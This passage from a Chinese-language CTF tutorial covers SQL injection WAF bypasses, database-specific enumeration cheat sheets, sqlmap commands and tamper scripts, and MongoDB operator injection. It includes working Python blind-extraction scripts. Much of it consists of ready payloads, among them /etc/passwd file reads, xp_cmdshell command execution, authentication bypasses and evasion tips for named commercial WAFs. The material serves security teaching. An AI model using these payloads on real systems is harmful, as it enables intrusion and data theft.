-1' UnIoN SeLeCt 1,group_concat(table_name),3 FrOm information_schema.tables WhErE table_schema=database() --
```

**方法二：双写关键字**

| 原始 | 双写 | 原理 |
|------|------|------|
| `union` | `uniunionon` | WAF 替换一次后还原 |
| `select` | `seselectlect` | 同上 |
| `from` | `frfromom` | 同上 |
| `where` | `whwhereere` | 同上 |
| `and` | `anandd` | 同上 |
| `or` | `oorr` | 同上 |

```sql
-1' uniunionon seselectlect 1,2,3 --
-1' uniunionon seselectlect 1,database(),3 --
-1' uniunionon seselectlect 1,group_concat(table_name),3 frfromom information_schema.tables --
```

**方法三：十六进制编码关键字**

| 关键字 | 十六进制 |
|--------|---------|
| `union` | `%75%6e%69%6f%6e` |
| `select` | `%73%65%6c%65%63%74` |
| `from` | `%66%72%6f%6d` |
| `where` | `%77%68%65%72%65` |

```sql
-1' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3 --
```

**方法四：MySQL 版本注释**

```sql
-1' /*!50000union*/ /*!50000select*/ 1,2,3 --
-1' /*!50000union*/ /*!50000select*/ 1,database(),3 --
```

**方法五：关键字等价替换**

| 被过滤 | 替换为 |
|--------|--------|
| `and` | `&&` |
| `or` | `||` |
| `=` | `like` / `regexp` / `in` / `between` |
| `sleep()` | `benchmark()` |
| `substr()` | `substring()` / `mid()` |
| `ascii()` | `ord()` |
| `database()` | `schema()` |
| `group_concat()` | `json_arrayagg()` |
| `order by` | `group by` |
| `limit` | `limit X offset Y` / `group_concat` |

### 18.3 引号过滤绕过

**场景：**单引号 `'` 或双引号 `"` 被过滤。

**方法一：十六进制代替字符串**

```sql
-- 表名 'users' 的十六进制是 0x7573657273
-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273 --

-- 数据库名 'ctf_db' 的十六进制是 0x6374665f6462
-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x6374665f6462 --
```

**方法二：使用 `concat_ws` 的十六进制分隔符**

```sql
-1' union select 1,group_concat(concat_ws(0x3a,username,password)),3 from users --
-- 0x3a = ':'
```

**方法三：load_file 的十六进制路径**

```sql
-1' union select 1, load_file(0x2f6574632f706173737764), 3 --
-- 0x2f6574632f706173737764 = '/etc/passwd'
```

### 18.4 逗号过滤绕过

**场景：**逗号 `,` 被过滤，无法使用 `substr(x,1,1)`、`limit 0,1` 等。

**方法一：LIMIT 改写**

```sql
-- 原版
limit 0,1
-- 改写为
limit 1 offset 0
limit 1 offset 3
```

**方法二：SUBSTRING 改写**

```sql
-- 原版
substr(database(),1,1)
-- 改写为
substring(database() from 1 for 1)

-- 布尔盲注中
1' and ascii(substring(database() from 1 for 1))=99 --
```

**方法三：IF 改写为 CASE WHEN**

```sql
-- 原版
if(条件, sleep(5), 0)
-- 改写为
case when 条件 then sleep(5) else 0 end

-- 示例
1' and case when length(database())=6 then sleep(5) else 0 end --
```

**方法四：Union 多列用 JOIN 省略逗号**

```sql
-- 原版
union select 1,2,3
-- MySQL 改写为
union select * from (select 1)a join (select 2)b join (select 3)c

-- 查数据库
union select * from (select 1)a join (select database())b join (select 3)c
```

### 18.5 注释符过滤绕过

**场景：**`-- ` 或 `#` 被过滤。

**方法一：换用其他注释符**

```sql
-- -- 被过滤换 #
1' order by 3%23

-- # 被过滤换 --
1' order by 3--%0c
```

**方法二：URL 编码注释符**

```txt
--  -> %2d%2d
#   -> %23
/*  -> %2f%2a
*/  -> %2a%2f
```

**方法三：不用注释符闭合**

```sql
1' and '1'='1
1' and '1'='2
-1' union select 1,2,3 where '1'='1
-1' union select 1,database(),3 where '1'='1
```

**方法四：块注释跨输入框**

```txt
输入框1：admin'/*
输入框2：*/ or 1=1 --
```

### 18.6 综合绕过实战案例

以下是一个综合 WAF 绕过案例，展示如何组合多种绕过技术在严格 WAF 下执行注入：

**场景：**WAF 过滤了空格、`union`、`select`、逗号、单引号、`--` 注释符

**目标 SQL：**`-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() -- `

**逐步绕过过程：**

| 步骤 | 绕过方式 | Payload |
|------|---------|---------|
| 空格 | `/**/` | `union/**/select` |
| 关键字 union | 双写 | `uniunionon/**/select` |
| 关键字 select | 十六进制 | `uniunionon/**/%73elect` |
| 逗号空格 | `/**/` | `group_concat(table_name)/**/from` |
| 引号 | 十六进制 | `table_schema=0x...` |
| 注释符 | `%23` | `-%23` |

**最终 payload：**

```sql
-1' uniunionon/**/%73elect/**/1,group_concat(table_name)/**/fr/**/om/**/information_schema.tables/**/where/**/table_schema=database()%23
```

### 18.7 常见 WAF 产品绕过技巧

| WAF 产品 | 常见弱点 | 绕过示例 |
|---------|---------|---------|
| 安全狗 | 对 `/*!` 版本注释处理不严 | `/*!union*/ /*!select*/ 1,2,3` |
| 云锁 | 对换行符绕过不严格 | `union%0a%23%0aselect` |
| ModSecurity | 对 `@variable` 格式处理特殊 | `union @var:select` |
| 阿里云 WAF | 对超长 payload 截断 | 填充大量垃圾字符到 8KB+ 触发截断 |
| Cloudflare | 对畸形 HTTP 请求处理弱 | 使用 HTTP/1.0 + Transfer-Encoding 绕过 |

### 18.8 数据库特殊语法绕过

**MySQL 特有绕过：**

```sql
-- 系统变量引用绕过
-1' union select @_version --
-1' union select @@basedir --

-- INTO 变量写法
-1' union select @a:=table_name from information_schema.tables limit 1 --

-- INFORMATION_SCHEMA 替换为缩写
where table_schema in (select schema() )
```

**PostgreSQL 特有绕过：**

```sql
-- CAST 类型转换
-1' union select 1, CAST(version() AS text), 3 --

-- Dollar-quoted 字符串
table_name = $$users$$
table_schema = $$public$$

-- 显式类型注入
-1'::int union select null, version(), null --
```

**SQL Server 特有绕过：**

```sql
-- TOP 代替 LIMIT
select top 1 name from sys.tables

-- EXEC 代替直接调用
exec('sel' + 'ect @@version')

-- 将结果写入临时表再查询
select name into #tmp from sys.tables; select * from #tmp
```

### WAF 绕过策略对比

| 绕过维度 | 首选方法 | 备选方法 |
|---------|---------|---------|
| 空格 | `/**/` | `%09`、`%0c`、小括号 |
| 关键字 | 双写 | 大小写、十六进制编码 |
| 引号 | 十六进制替代 | `CHAR()`、`CONCAT()` |
| 逗号 | FROM/FOR 改写 | JOIN 替代 |
| 注释符 | 互换 `--` 和 `#` | 恒等条件闭合 |
| 函数名 | 同义替换 | 数据库特殊语法 |
| 系统表 | 堆叠+SHOW | MySQL innodb 表 |
| 整条语句 | 换行分批 | 垃圾字符填充截断 |

> **新手避坑：** WAF 绕过不是一蹴而就的。建议的方法是：逐个拦截关键字测试，确认到底过滤了什么。比如先测 `union` 是否被拦，再测 `select`，再测空格。每次只改一个绕过方式，不要一次性叠加太多（否则你不知道哪个生效了）。另外，很多 CTF 的 WAF 只过滤了 `union select` 连写，中间加个注释就绕过：`union/**/select`。

> **老手技巧：** 如果遇到全流量 WAF，尝试以下思路：1) 使用 HTTP/1.0 代替 HTTP/1.1；2) 在请求头中加入 `X-Forwarded-For: 127.0.0.1` 尝试内网绕过；3) 使用分块传输编码 `Transfer-Encoding: chunked` 绕过 WAF 正文检测；4) 对 payload 进行 URL 编码 + Unicode 编码 + 注释多层嵌套。

---

## 19. 数据库差异

### 19.1 辨别数据库类型

#### 指纹初步判断

| 技术栈 | 常见数据库 | 提示特征 |
|--------|-----------|---------|
| PHP / Laravel / WordPress | MySQL / MariaDB | `wp_` 表前缀 |
| Java / Spring Boot | MySQL / PostgreSQL / Oracle | `WEB-INF` 路径 |
| Python / Flask / Django | SQLite / PostgreSQL | `.db` 文件、`sqlite` 报错 |
| Node.js / Express | MongoDB / MySQL | JSON API、NoSQL |
| .NET / ASP.NET | SQL Server | `IIS` 标识、`.aspx` |
| Ruby on Rails | PostgreSQL / SQLite | `schema_migrations` 表 |

#### 通过函数判断

```sql
-- 查版本
-1' union select 1, version(), 3 --         -- MySQL / PostgreSQL
-1' union select 1, sqlite_version(), 3 --  -- SQLite
-1' union select 1, @@version, 3 --        -- MySQL / SQL Server

-- 查当前数据库
-1' union select 1, database(), 3 --        -- MySQL
-1' union select 1, current_database(), 3 -- PostgreSQL
-1' union select 1, db_name(), 3 --        -- SQL Server
```

#### 四大数据库函数对照表

| 作用 | MySQL | PostgreSQL | SQL Server | SQLite |
|------|-------|-------------|------------|--------|
| 查版本 | `version()` | `version()` | `@@version` | `sqlite_version()` |
| 当前数据库 | `database()` | `current_database()` | `db_name()` | 无 |
| 当前用户 | `user()` | `current_user` | `suser_sname()` | 无 |
| 拼接字符串 | `concat('a','b')` | `'a'||'b'` | `'a'+'b'` | `'a'||'b'` |
| 拼接多行 | `group_concat()` | `string_agg()` | `string_agg()` (2017+) | `group_concat()` |
| 截取字符 | `substr()` | `substring()` | `substring()` | `substr()` |
| ASCII 码 | `ascii()` | `ascii()` | `ascii()` / `unicode()` | `unicode()` |
| 字符串长度 | `length()` | `length()` | `len()` | `length()` |
| 延时 | `sleep(N)` | `pg_sleep(N)` | `waitfor delay '0:0:N'` | 无原生函数 |
| 查系统表 | `information_schema` | `pg_catalog` | `sys.tables` | `sqlite_master` |
| 文件读取 | `load_file()` | `pg_read_file()` | `OPENROWSET` | 无 |
| 文件写入 | `into outfile` | `COPY` | `xp_cmdshell` | 无 |
| 分页 | `limit X offset Y` | `limit X offset Y` | `offset X rows fetch next Y` | `limit X offset Y` |
| 注释符 | `--` / `#` / `/* */` | `--` / `/* */` | `--` / `/* */` | `--` / `/* */` |

#### 通过延时函数判断

```sql
-- MySQL
1' and sleep(5) --           延迟 5 秒 → MySQL

-- PostgreSQL
1' and pg_sleep(5) --         延迟 5 秒 → PostgreSQL

-- SQL Server
1'; waitfor delay '0:0:5' --  延迟 5 秒 → SQL Server

-- SQLite（无原生 sleep，需大量计算）
1' and randomblob(100000000) --  可能延迟 → SQLite
```

#### 通过字符串拼接判断

```sql
-- MySQL：concat()
-1' union select 1, concat('a','b'), 3 --
-- 如果页面显示 'ab' → MySQL

-- SQLite / PostgreSQL：||
-1' union select 1, 'a'||'b', 3 --
-- 如果页面显示 'ab' → SQLite 或 PostgreSQL

-- SQL Server：+
-1' union select 1, 'a'+'b', 3 --
-- 如果页面显示 'ab' → SQL Server
```

### 19.2 MySQL 详细速查

```sql
-- 查版本
-1' union select 1, @@version, 3 --

-- 查所有数据库
-1' union select 1, group_concat(schema_name), 3 from information_schema.schemata --

-- 查当前库的所有表
-1' union select 1, group_concat(table_name), 3 from information_schema.tables where table_schema=database() --

-- 查表的列
-1' union select 1, group_concat(column_name), 3 from information_schema.columns where table_schema=database() and table_name='users' --

-- 查数据
-1' union select 1, group_concat(concat_ws(':',username,password)), 3 from users --
```

### 19.3 SQLite 详细速查

```sql
-- 查版本
-1' union select 1, sqlite_version(), 3 --

-- 查所有表
-1' union select 1, group_concat(name), 3 from sqlite_master where type='table' --

-- 查建表语句（包含所有列名）
-1' union select 1, sql, 3 from sqlite_master where type='table' and name='users' --

-- 查数据
-1' union select 1, group_concat(username || ':' || password), 3 from users --

-- 布尔盲注（SQLite 用 unicode() 替代 ascii()）
1' and unicode(substr(sqlite_version(),1,1))=51 --

-- 时间盲注（SQLite 无 sleep，用大量计算）
1' and case when unicode(substr(database(),1,1))>100 then randomblob(100000000) else 1 end --
```

### 19.4 PostgreSQL 详细速查

```sql
-- 查版本
-1' union select 1, version(), 3 --

-- 当前数据库
-1' union select 1, current_database(), 3 --

-- 所有数据库
-1' union select 1, string_agg(datname, ','), 3 from pg_database --

-- 所有表
-1' union select 1, string_agg(tablename, ','), 3 from pg_catalog.pg_tables where schemaname='public' --

-- 文件读取
-1' union select 1, pg_read_file('/flag', 0, 100), 3 --

-- 时间盲注
1' and (select count(*) from pg_sleep(5))=1 --
```

### 19.5 SQL Server 详细速查

```sql
-- 查版本
-1' union select 1, @@version, 3 --

-- 当前数据库
-1' union select 1, db_name(), 3 --

-- 所有数据库
-1' union select 1, (select string_agg(name, ',') from sys.databases), 3 --

-- 所有表
-1' union select 1, (select string_agg(name, ',') from sys.tables), 3 --

-- 时间盲注
1'; if len(db_name())=6 waitfor delay '0:0:5' --

-- 命令执行（如果 xp_cmdshell 启用）
1'; exec master..xp_cmdshell 'whoami' --
```

### 19.6 Oracle 详细速查

Oracle 在企业级应用中广泛使用，其 SQL 语法与 MySQL 差异较大。

**Oracle 常见差异：**

| 作用 | Oracle 写法 |
|------|-------------|
| 查版本 | `SELECT banner FROM v$version` |
| 当前数据库 | `SELECT ora_database_name FROM dual` |
| 当前用户 | `SELECT user FROM dual` |
| 字符串拼接 | `'a' \|\| 'b'` 或 `CONCAT('a','b')` |
| 多行合并 | `LISTAGG(列, ',') WITHIN GROUP (ORDER BY 列)` |
| 截取字符 | `SUBSTR(列, 位置, 长度)` |
| 延时 | `dbms_pipe.receive_message('x', N)` |
| 报错 | `CTXSYS.DRITHSX.SN(...)` |
| 系统表(查表) | `all_tables` / `user_tables` |
| 系统表(查列) | `all_tab_columns` / `user_tab_columns` |
| 虚拟表 | `dual`（必须 FROM） |
| 分页 | `rownum` / `OFFSET ... ROWS FETCH NEXT` (12c+) |

**枚举语句：**

```sql
-- 查版本
-1' union select 1, (select banner from v$version where rownum=1), 3 from dual --

-- 当前用户
-1' union select 1, (select user from dual), 3 from dual --

-- 所有表（当前用户可访问）
-1' union select 1, (select listagg(table_name, ',') within group (order by table_name) from user_tables), 3 from dual --

-- 所有列
-1' union select 1, (select listagg(column_name, ',') within group (order by column_name) from user_tab_columns where table_name='USERS'), 3 from dual --

-- 数据
-1' union select 1, (select listagg(username || ':' || password, ',') within group (order by username) from users), 3 from dual --
```

**Oracle 时间盲注：**

```sql
-- dbms_pipe.receive_message 延时
1' and (select case when length((select user from dual))=5 then dbms_pipe.receive_message('x',5) else 1 end from dual) is null --
1' and (select case when ascii(substr((select user from dual),1,1))>65 then dbms_pipe.receive_message('x',5) else 1 end from dual) is null --
```

**Oracle 报错注入：**

```sql
-- CTXSYS.DRITHSX.SN 报错
1' and (select upper(xmltype(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null --

-- 利用 utl_inaddr 报错
1' and (select utl_inaddr.get_host_name((select user from dual)) from dual) is not null --
```

> **新手避坑：** Oracle 注入与 MySQL 最大的区别在于：1) Oracle 的 SELECT **必须带 FROM**，单表查询用 `FROM dual`；2) Oracle 没有 `information_schema`，查表用 `all_tables`/`user_tables`；3) Oracle 字符串拼接用 `||` 而不是 `CONCAT()`；4) Oracle 的 `SUBSTR()` 函数起始位置从 1 开始；5) 表名和列名默认是大写的。

### 19.7 数据库综合对比速查表

| 功能 | MySQL | SQLite | PostgreSQL | SQL Server | Oracle |
|------|-------|--------|-------------|------------|--------|
| 版本查询 | `version()` | `sqlite_version()` | `version()` | `@@version` | `SELECT * FROM v$version` |
| 当前数据库 | `database()` | 无（文件即库） | `current_database()` | `db_name()` | `SELECT ora_database_name FROM dual` |
| 当前用户 | `user()` | 无 | `current_user` | `suser_sname()` | `SELECT user FROM dual` |
| 必要 FROM | 可选 | 可选 | 可选 | 可选 | **必须有 `FROM dual`**|
| 字符串拼接 | `concat()` 或 `\|\|` | `\|\|` | `\|\|` | `+` | `\|\|` |
| 多行合并 | `group_concat()` | `group_concat()` | `string_agg()` | `string_agg()` (2017+) | `listagg()` |
| 截取字符串 | `substr()` | `substr()` | `substring()` | `substring()` | `substr()` |
| 字符串长度 | `length()` | `length()` | `length()` | `len()` | `length()` |
| 取第 N 行 | `limit N-1,1` | `limit N-1,1` | `limit N-1,1` | `top` | `rownum` |
| 行注释 | `--` 或 `#` | `--` | `--` | `--` | `--` |
| 报错注入 | `updatexml()` / `extractvalue()` | 无 | `cast(x as int)` | `convert(int, x)` | `utl_inaddr` / `xmltype` |
| 延时注入 | `sleep(N)` | `randomblob(1e8)` | `pg_sleep(N)` | `waitfor delay '0:0:N'` | `dbms_pipe.receive_message('x',N)` |
| 文件读取 | `load_file()` | `readfile()`（扩展） | `pg_read_file()` | `openrowset(bulk...)` | `utl_file.fopen()` |
| 单引号转义 | `\'` 或 `''` | `''` | `''` | `''` | `''` |

> **新手避坑：** 区分数据库类型是注入的第一步。最快速的方法：先试 `version()`，再试 `@@version`，再试 `sqlite_version()`。如果 `sleep()` 不行试试 `pg_sleep()`。另外，SQLite 很特殊——它没有 `information_schema`、没有 `database()`、没有原生 `sleep()`，如果你在一个目标上试了所有这些都没有，它很可能是 SQLite。Oracle 则必须带 `FROM dual`，这也是一个很好的判断信号。

---

## 20. sqlmap 使用

### 场景

手工注入太耗时，让自动化工具来解放你。sqlmap 是最流行的 SQL 注入检测和利用工具。

### 原理

sqlmap 自动检测注入点、判断数据库类型、选择合适的注入技术，并提取数据。

### 实战：基础使用

```bash
# 查看帮助
sqlmap -h
sqlmap -hh

# 检测 GET 参数
sqlmap -u "http://target/article.php?id=1" -p id
sqlmap -u "http://target/article.php?id=1" --batch    # 自动选择默认选项

# 检测 POST 参数
sqlmap -u "http://target/login.php" --data="username=admin&password=123" -p username

# 使用请求文件（BurpSuite 抓包后保存）
sqlmap -r request.txt -p id
```

### level 和 risk 参数

| level | 测试范围 | 适用场景 |
|-------|---------|---------|
| 1 | GET+POST 参数（默认） | 快速检测 |
| 2 | + Cookie 参数 | 需要 cookie 注入时 |
| 3 | + User-Agent / Referer | WAF 绕过、头部注入 |
| 4 | + 更多 payload 和闭合 | WAF 严格时 |
| 5 | + Host 等所有位置 | 彻底检测 |

| risk | 风险等级 | 说明 |
|------|---------|------|
| 1 | 低（默认） | 安全的测试 |
| 2 | 中 | 增加时间盲注 payload |
| 3 | 高 | 增加 OR 型 payload（可能修改数据） |

### 推荐查询流程

```bash
# 1. 查当前数据库
sqlmap -u "http://target/article.php?id=1" --current-db

# 2. 查所有数据库
sqlmap -u "http://target/article.php?id=1" --dbs

# 3. 查表
sqlmap -u "http://target/article.php?id=1" -D ctf_db --tables

# 4. 查列
sqlmap -u "http://target/article.php?id=1" -D ctf_db -T users --columns

# 5. 查数据
sqlmap -u "http://target/article.php?id=1" -D ctf_db -T users -C "username,password" --dump

# 6. 搜索 flag 相关表和列
sqlmap -u "http://target/article.php?id=1" --search -T flag
sqlmap -u "http://target/article.php?id=1" --search -C "flag,secret,token"
```

### 高级技巧

```bash
# 指定注入技术（B布尔 E报错 U联合 S堆叠 T时间 Q内联）
sqlmap -u "http://target/article.php?id=1" --technique=BEU

# 指定数据库类型
sqlmap -u "http://target/article.php?id=1" --dbms=MySQL

# 帮助判断真假页面
sqlmap -u "http://target/article.php?id=1" --string="Welcome"
sqlmap -u "http://target/article.php?id=1" --not-string="Not Found"

# 查看发送的 payload
sqlmap -u "http://target/article.php?id=1" -v 3

# 经过 BurpSuite 代理
sqlmap -u "http://target/article.php?id=1" --proxy="http://127.0.0.1:8080"

# 并发线程加速
sqlmap -u "http://target/article.php?id=1" --technique=B --threads=5

# 文件读取
sqlmap -u "http://target/article.php?id=1" --file-read="/flag"

# Tamper 脚本（WAF 绕过）
sqlmap -u "http://target/article.php?id=1" --tamper=space2comment
sqlmap -u "http://target/article.php?id=1" --tamper="between,randomcase,space2comment"

# 二次注入
sqlmap -r register.txt -p username --second-url="http://target/profile.php"

# 清理缓存
sqlmap -u "http://target/article.php?id=1" --flush-session
```

### CTF 推荐流程

```
1. 浏览器 / BurpSuite 发送一次正常请求
2. 手工测试单引号、永真/永假条件
3. 判断存在注入后，保存完整请求为 request.txt
4. 跑 sqlmap：
   sqlmap -r request.txt -p id -v 3
5. 如果特征明显，主动指定：
   sqlmap -r request.txt -p id --string="Welcome"
6. 确认注入后按顺序查数据
7. 检测不到时检查：Cookie 是否有效、参数位置、页面特征、Session 缓存
```

### 常见错误与排错

| 错误现象 | 可能原因 | 解决方案 |
|---------|---------|---------|
| "unable to connect" | 网络问题或代理 | 检查能否正常 curl |
| "all tested parameters appear to be not injectable" | 参数位置不对 | 用 `*` 标记位置 |
| "no parameter(s) tested" | 没有指定参数 | 用 `-p` 指定参数名 |
| 检测到了但什么都查不到 | Cookie 过期 | 更新 Cookie 或重新抓包 |
| 布尔盲注异常慢 | 没有指定真假特征 | 用 `--string` / `--not-string` 辅助 |
| 报错 "timeout" | 网络延迟太高 | 用 `--time-sec=1` 缩短等待 |
| 检测到注入但 dump 返回空 | 权限不足 | 检查当前用户权限 |
| ERR_CONNECT_RESET | 目标触发了 WAF | 添加 `--random-agent` + `--tamper` |

### 常用 Tamper 脚本大全

| Tamper 名称 | 作用 | 使用场景 |
|------------|------|---------|
| `space2comment` | 空格替换为 `/**/` | 通用空格过滤 |
| `space2plus` | 空格替换为 `+` | URL 参数场景 |
| `space2hash` | 空格替换为 `#` + 换行 | MySQL 专属 |
| `space2mssqlblank` | 空格替换为 SQL Server 空白 | SQL Server 场景 |
| `between` | `>` 替换为 `NOT BETWEEN` | 等号/大于号过滤 |
| `randomcase` | SQL 关键字大小写随机 | 简单 WAF |
| `bluecoat` | `OR 1=1` 替换为 `OR 1=1--` | BlueCoat WAF |
| `modsecurityversioned` | MySQL 版本注释 | ModSecurity |
| `charencode` | URL 编码全部字符 | IE 场景 |
| `charunicodeencode` | Unicode 编码 | 非 ASCII 场景 |
| `greatest` | `>` 替换为 `GREATEST()` | 大小比较过滤 |
| `ifnull2casewhen` | IFNULL 替换为 CASE WHEN | 函数过滤 |
| `plus2concat` | `+` 替换为 `CONCAT()` | SQL Server 场景 |
| `apostrophemaskencode` | 单引号替换为 UTF-8 编码 | 引号过滤 |
| `percentage` | 在 SELECT 前加 `%` | 模糊匹配场景 |
| `appendnewline` | payload 末尾加换行 | WAF 绕过 |
| `multiplespaces` | 多空格代替单空格 | 简单空格检测 |

### 性能优化技巧

```bash
# 布尔盲注太慢？用多线程
sqlmap -r request.txt -p id --technique=B --threads=10

# 指定字符集大幅加速
sqlmap -r request.txt -p id --charset="0123456789abcdef" --dump

# 已有 session 缓存，跳过重复检测
sqlmap -r request.txt -p id --batch

# 清除 session 重新检测
sqlmap -r request.txt -p id --flush-session

# 时间盲注调短延迟
sqlmap -r request.txt -p id --technique=T --time-sec=2

# 限定注入类型，避免无效尝试
sqlmap -r request.txt -p id --technique=BEUSTQ

# 不请求静态文件
sqlmap -r request.txt -p id --skip-static

# 继续已中断的注入（不重新检测）
sqlmap -r request.txt -p id --keep-alive
```

> **新手避坑：** 不要一开始就 `--dump-all`！这会下载所有数据库的所有表，非常耗时且可能造成大量流量。按顺序从 `--current-db` → `--tables` → `--columns` → `--dump` 递进查询。另外，如果 sqlmap 检测不到注入，先手工确认注入是否真的存在——很多情况下是 Cookie 过期或参数名不对。

> **高级技巧：** 如果目标有 CSRF Token 保护，用 `--csrf-token=csrf_token` 自动获取和刷新 Token。如果目标是 REST API 且参数在 URL 路径中（如 `/api/user/1`），用 `*` 标记测试位置：`sqlmap -u "http://target/api/user/1*"`。

---

## 21. NoSQL 注入

### 场景

网站使用的是 MongoDB 等 NoSQL 数据库。登录框传入 JSON 数据，你发现可以把字符串改成 MongoDB 操作符（如 `$ne`）来绕过认证。

### 原理

MongoDB 使用 JSON/对象格式的查询选择器，而不是 SQL 字符串。如果后端直接把用户输入的 JSON 传递给查询，攻击者就可以把普通值改为 MongoDB 操作符。

**正常查询：**

```javascript
db.users.findOne({
    username: "admin",
    password: "secret123"
});
```

**注入后：**

```javascript
db.users.findOne({
    username: "admin",
    password: {"$ne": null}
});
```

`$ne` 表示"不等于"，这条查询不再要求密码等于特定值，而是只要密码不等于 null 就通过。

### 实战：SQL vs MongoDB 对比

| 对比项 | SQL 注入 | MongoDB 注入 |
|--------|---------|-------------|
| 载体 | SQL 字符串 | JSON / 查询对象 |
| 关键点 | 闭合引号并拼接 SQL | 把字段值变成操作符对象 |
| 常见输入 | `' or 1=1 --` | `{"$ne": null}` |
| 检查内容 | SQL 字符串 | 对象类型和过滤器 |

### MongoDB 操作符大全

| 操作符 | 含义 | 注入示例 |
|--------|------|---------|
| `$ne` | not equal（不等于） | `{"password":{"$ne":null}}` |
| `$gt` | greater than（大于） | `{"age":{"$gt":0}}` |
| `$gte` | greater or equal | `{"level":{"$gte":1}}` |
| `$lt` | less than（小于） | `{"score":{"$lt":100}}` |
| `$in` | in array（在列表中） | `{"role":{"$in":["admin","root"]}}` |
| `$nin` | not in array | `{"role":{"$nin":["guest"]}}` |
| `$exists` | 字段存在 | `{"flag":{"$exists":true}}` |
| `$regex` | 正则匹配 | `{"password":{"$regex":"^flag"}}` |
| `$or` | 或条件 | `{"$or":[{"role":"admin"},{"vip":true}]}` |
| `$where` | JavaScript 表达式 | `{"$where":"this.role==='admin'"}` |

### 身份认证绕过 Payload

```json
// 任意用户登录
{"username":{"$ne":null},"password":{"$ne":null}}

// 指定 admin 用户
{"username":"admin","password":{"$ne":null}}

// 正则匹配用户名
{"username":{"$regex":"^admin"},"password":{"$ne":null}}

// 任意非空
{"username":{"$gt":""},"password":{"$gt":""}}
```

### 传参方式

**JSON 请求体：**

```http
POST /login HTTP/1.1
Content-Type: application/json

{"username":"admin","password":{"$ne":null}}
```

**URL 编码表单（PHP 风格）：**

```txt
username=admin&password[$ne]=x
```

**Query 参数中的 JSON：**

```txt
/login?filter={"username":"admin","password":{"$ne":null}}
```

### $regex 盲注

```json
// 判断密码是否以 f 开头
{"username":"admin","password":{"$regex":"^f"}}

// 判断密码是否以 fl 开头
{"username":"admin","password":{"$regex":"^fl"}}

// 判断密码长度是否为 8
{"username":"admin","password":{"$regex":"^.{8}$"}}
```

### $regex 盲注脚本

```python
import re
import string
import requests

url = 'http://target/login'
username = 'admin'
chars = string.ascii_letters + string.digits + '_{}-@!'
known = ''

for _ in range(128):
    found = False
    for ch in chars:
        candidate = known + ch
        pattern = '^' + re.escape(candidate)
        res = requests.post(url, json={
            'username': username,
            'password': {'$regex': pattern}
        }, timeout=5)
        if 'login success' in res.text:
            known = candidate
            found = True
            print('[+]', known)
            break
    if not found:
        break

print('result:', known)
```

### 完整自动化脚本（含验证）

```python
import re
import string
import sys
import requests

target = 'http://target/login'
target_user = 'admin'
alphabet = string.ascii_letters + string.digits + '_{}-@!$.'
max_length = 128

session = requests.Session()

def send_password_filter(password_filter):
    response = session.post(
        target,
        json={
            'username': target_user,
            'password': password_filter
        },
        timeout=5,
        allow_redirects=False
    )
    return response

def is_true(response):
    return (
        response.status_code in {200, 302}
        and 'login failed' not in response.text
    )

def check_oracle():
    """验证真假条件能否稳定区分"""
    true_resp = send_password_filter({'$regex': '.*'})
    false_resp = send_password_filter({'$regex': 'a^'})
    print('[*] true  response:', true_resp.status_code, len(true_resp.content))
    print('[*] false response:', false_resp.status_code, len(false_resp.content))
    if is_true(true_resp) == is_true(false_resp):
        print('[-] 真假条件无法稳定区分，请先修改 is_true()')
        return False
    return True

def extract_prefix():
    known = ''
    for _ in range(max_length):
        found = False
        for char in alphabet:
            candidate = known + char
            pattern = '^' + re.escape(candidate)
            response = send_password_filter({'$regex': pattern})
            if is_true(response):
                known = candidate
                found = True
                print('[+]', known)
                break
        if not found:
            break
    return known

if not check_oracle():
    sys.exit(1)

result = extract_prefix()
print('[+] final result:', result)
```

### $where 操作符注入（更强大但限制更多）

`$where` 允许在 MongoDB 中执行 JavaScript 表达式，用它可以在服务端执行任意 JS 代码：

```json
// 判断密码长度
{"username":"admin","$where":"this.password.length==8"}

// 判断字符（注意 JS 区分大小写）
{"username":"admin","$where":"this.password[0]=='f'"}

// 使用 JS 函数
{"username":"admin","$where":"this.password.match(/^flag/)"}

// 使用 toString + charCodeAt（数字比较）
{"username":"admin","$where":"this.password.charCodeAt(0)>100"}
```

**$where 盲注脚本：**

```python
import requests

url = 'http://target/login'
known = ''

for i in range(1, 100):
    found = False
    for code in range(32, 127):
        payload = {
            'username': 'admin',
            '$where': f"this.password.charCodeAt({i-1})=={code}"
        }
        resp = requests.post(url, json=payload, timeout=5)
        if 'login success' in resp.text:
            known += chr(code)
            print(f'[+] {known}')
            found = True
            break
    if not found:
        break

print('result:', known)
```

### 其他 NoSQL 数据库的注入

虽然 CTF 中 MongoDB 注入最常见，但其他 NoSQL 数据库也存在类似问题：

| 数据库 | 查询方式 | 注入原理 |
|--------|---------|---------|
| MongoDB | JSON 查询选择器 | 字段值替换为操作符对象 |
| Redis | 命令拼接 | 换行符注入执行多条命令 |
| Elasticsearch | JSON Query DSL | 特殊字符破坏查询结构 |
| CouchDB | JSON 视图查询 | 对象类型篡改 |
| Cassandra | CQL 字符串 | 类似 SQL 的拼接注入 |

> **新手避坑：** NoSQL 注入的关键区别在于：SQL 注入关注"最终 SQL 字符串长什么样"，MongoDB 注入关注"解析后的对象类型和最终查询过滤器"。如果你把 `$ne` 当字符串传进去（`{"password": "$ne"}`），它只是普通字符串，不是操作符。真正的注入是把整个值变成 `{"$ne": null}` 这样的子对象。

> **传参注意：** PHP 风格的数组参数字段 `password[$ne]=x` 只在特定框架中有效。如果后端是 Node.js + Express，必须用 JSON Body 传参才能注入操作符。先用 Content-Type: application/json 测试，再尝试 URL 编码方式。

---

## 22. CTF 综合实战案例

### 案例1：简单的 Union 注入

**题目描述：**一个文章查看页面，URL 为 `http://target/article.php?id=1`，id 参数存在注入。

**解题步骤：**

| 步骤 | 操作 | Payload | 结果 |
|------|------|---------|------|
| 1 | 确认注入点 | `1'` | 页面报错显示 SQL 语法错误 |
| 2 | 测试闭合方式 | `1' and 1=1 --+` / `1' and 1=2 --+` | 1=1 正常，1=2 异常 → 单引号闭合 |
| 3 | 判断列数 | `1' order by 3 --+` 正常，`order by 4` 报错 | 共 3 列 |
| 4 | 找显示位 | `-1' union select 1,2,3 --+` | 页面显示 2 和 3 |
| 5 | 查数据库名 | `-1' union select 1,database(),3 --+` | 返回 `ctf_db` |
| 6 | 查表名 | `-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+` | 返回 `articles,users,flag` |
